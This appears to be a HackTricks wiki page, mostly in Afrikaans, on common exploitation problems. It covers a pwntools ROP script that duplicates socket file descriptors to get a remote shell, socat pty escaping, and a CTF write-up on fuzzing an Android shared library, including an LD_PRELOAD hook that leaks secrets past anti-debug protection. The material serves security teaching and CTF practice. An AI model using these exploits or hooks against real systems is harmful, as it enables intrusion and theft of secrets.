# Common Exploiting Problems

{{#include ../banners/hacktricks-training.md}}

## FDs in Remote Exploitation

Wanneer jy 'n exploit na 'n remote server stuur wat byvoorbeeld **`system('/bin/sh')`** aanroep, sal dit natuurlik in die server-proses uitgevoer word, en `/bin/sh` sal invoer van stdin (FD: `0`) verwag en die uitvoer na stdout en stderr (FDs `1` en `2`) stuur. Die aanvaller sal dus nie met die shell kan interaksie hê nie.

'n Manier om dit reg te stel is om aan te neem dat toe die server begin het dit die **FD number `3`** (for listening) geskep het en dat jou verbinding dan in die **FD number `4`** gaan wees. Daarom is dit moontlik om die syscall **`dup2`** te gebruik om die stdin (FD 0) en die stdout (FD 1) na die FD 4 (die een van die attacker se connection) te dupliseer, sodat dit moontlik word om die shell te bereik sodra dit uitgevoer is.

[**Exploit example from here**](https://ir0nstone.gitbook.io/notes/types/stack/exploiting-over-sockets/exploit):
```python
from pwn import *

elf = context.binary = ELF('./vuln')
p = remote('localhost', 9001)

rop = ROP(elf)
rop.raw('A' * 40)
rop.dup2(4, 0)
rop.dup2(4, 1)
rop.win()

p.sendline(rop.chain())
p.recvuntil('Thanks!\x00')
p.interactive()
```
## Socat & pty

Let wel dat socat reeds **`stdin`** en **`stdout`** na die socket oordra. Die `pty`-modus sluit egter **DELETE characters in**. Dus, as jy `\x7f` (`DELETE`) stuur, sal dit die vorige karakter van jou exploit **verwyder**.

Om dit te omseil moet die **escape character `\x16` voor enige gestuurde `\x7f` geplaas word.**

**Hier kan jy** [**find an example of this behaviour**](https://ir0nstone.gitbook.io/hackthebox/challenges/pwn/dream-diary-chapter-1/unlink-exploit)**.**

## Android AArch64 shared-library fuzzing & LD_PRELOAD hooking

As 'n Android-app slegs 'n gestripte AArch64 `.so` bevat, kan jy steeds fuzz die geëksporteerde logika direk op die toestel uitvoer sonder om die APK te herbou. 'n Praktiese werkvloei:

1. **Bepaal callable entry points.** `objdump -T libvalidate.so | grep -E "validate"` lys vinnig die geëksporteerde funksies. Decompilers (Ghidra, IDA, BN) openbaar die werklike signature, bv. `int validate(const uint8_t *buf, uint64_t len)`.
2. **Skryf 'n standalone harness.** Laai 'n lêer, hou die buffer lewendig, en roep die geëksporteerde symbol presies soos die app sou doen. Cross-compile met die NDK (bv. `aarch64-linux-android21-clang harness.c -L. -lvalidate -fPIE -pie`).

<details>
<summary>Minimal file-driven harness</summary>
```c
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <unistd.h>

extern int validate(const uint8_t *buf, uint64_t len);

int main(int argc, char **argv) {
if (argc < 2) return 1;
int fd = open(argv[1], O_RDONLY);
if (fd < 0) return 1;
struct stat st = {0};
if (fstat(fd, &st) < 0) return 1;
uint8_t *buffer = malloc(st.st_size + 1);
read(fd, buffer, st.st_size);
close(fd);
int ret = validate(buffer, st.st_size);
free(buffer);
return ret;
}
```
</details>

3. **Herbou die verwagte struktuur.** Foutstringe en vergelykings in Ghidra het getoon dat die funksie streng JSON met konstante sleutels (`magic`, `version`, nested `root.children.*`) en rekenkundige kontroles (bv., `value * 2 == 84` ⇒ `value` moet `42` wees) ontleed het. Deur sintakties geldige JSON te voorsien wat geleidelik elke tak bevredig, kan jy die skema karteer sonder instrumentasie.
4. **Omseil anti-debug om geheime te leak.** Omdat die `.so` `snprintf` invoer, oorskryf dit met `LD_PRELOAD` om sensitiewe format strings te dump selfs wanneer breakpoints geblokkeer is:

<details>
<summary>Minimale snprintf leak hook</summary>
```c
#define _GNU_SOURCE
#include <dlfcn.h>
#include <stdarg.h>
#include <stdio.h>
#include <string.h>

typedef int (*vsnprintf_t)(char *, size_t, const char *, va_list);

int snprintf(char *str, size_t size, const char *fmt, ...) {
static vsnprintf_t real_vsnprintf;
if (!real_vsnprintf)
real_vsnprintf = (vsnprintf_t)dlsym(RTLD_NEXT, "vsnprintf");

va_list args;
va_start(args, fmt);
va_list args_copy;
va_copy(args_copy, args);
if (fmt && strstr(fmt, "MHL{")) {
fprintf(stdout, "[LD_PRELOAD] flag: ");
vfprintf(stdout, fmt, args);
fputc('\n', stdout);
}
int ret = real_vsnprintf(str, size, fmt, args_copy);
va_end(args_copy);
va_end(args);
return ret;
}
```
</details>

`LD_PRELOAD=./hook.so ./validate_harness payload.json` exfiltrates the internal flag and confirms the crash oracle without patching the binary.
5. **Shrink the fuzz space.** Disassembly het 'n XOR-sleutel blootgestel wat oor die flag-vergelyking herbruik is, wat beteken die eerste sewe bytes van `flag` was bekend. Net fuzz die nege onbekende bytes.
6. **Embed fuzz bytes inside a valid JSON envelope.** Die AFL harness lees presies nege bytes vanaf `stdin`, kopieer dit in die flag-suffix, en hard-codeer elke ander veld (constants, tree depths, arithmetic preimage). Enige foutiewe lees verlaat eenvoudig, so AFL bestee siklusse aan sinvolle testcases.

<details>
<summary>AFL-friendly harness for structured JSON</summary>
```c
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

extern int validate(unsigned char *bytes, size_t len);

#define FUZZ_SIZE 9

int main(void) {
uint8_t blob[FUZZ_SIZE];
if (read(STDIN_FILENO, blob, FUZZ_SIZE) != FUZZ_SIZE) return 0;
char suffix[FUZZ_SIZE + 1];
memcpy(suffix, blob, FUZZ_SIZE);
suffix[FUZZ_SIZE] = '\0';
char json[512];
int len = snprintf(json, sizeof(json),
"{\"magic\":16909060,\"version\":1,\"padding\":0,\"flag\":\"MHL{827b07c%s}\"," \
"\"root\":{\"type\":16,\"level\":3,\"num_children\":1,\"children\":[" \
"{\"type\":32,\"level\":2,\"num_children\":1,\"subchildren\":[" \
"{\"type\":48,\"level\":1,\"num_children\":1,\"leaves\":[" \
"{\"type\":64,\"level\":0,\"reserved\":0,\"value\":42}]}}]}}",
suffix);
if (len <= 0 || (size_t)len >= sizeof(json)) return 0;
validate((unsigned char *)json, len);
return 0;
}
```
</details>

7. **Voer AFL uit met die crash-as-success oracle.** Any input that satisfies every semantic check and guesses the correct nine-byte suffix triggers the deliberate crash; those files land in `output/crashes` and can be replayed through the simple harness to recover the secret.

Hierdie workflow laat jou toe om anti-debug-protected JNI validators vinnig te triage, leak secrets wanneer nodig, en dan fuzz slegs die betekenisvolle bytes, alles sonder om die oorspronklike APK aan te raak.

### Verwante bladsye

{{#ref}}
../mobile-pentesting/android-app-pentesting/reversing-native-libraries.md
{{#endref}}

{{#ref}}
../reversing/reversing-tools-basic-methods/README.md
{{#endref}}

## Verwysings

- [FD duplication exploit example](https://ir0nstone.gitbook.io/notes/types/stack/exploiting-over-sockets/exploit)
- [Socat delete-character behaviour](https://ir0nstone.gitbook.io/hackthebox/challenges/pwn/dream-diary-chapter-1/unlink-exploit)
- [FuzzMe – Reverse Engineering and Fuzzing an Android Shared Library](https://hackmd.io/@sal/fuzzme-mobilehackinglab-ctf-writeup)

{{#include ../banners/hacktricks-training.md}}
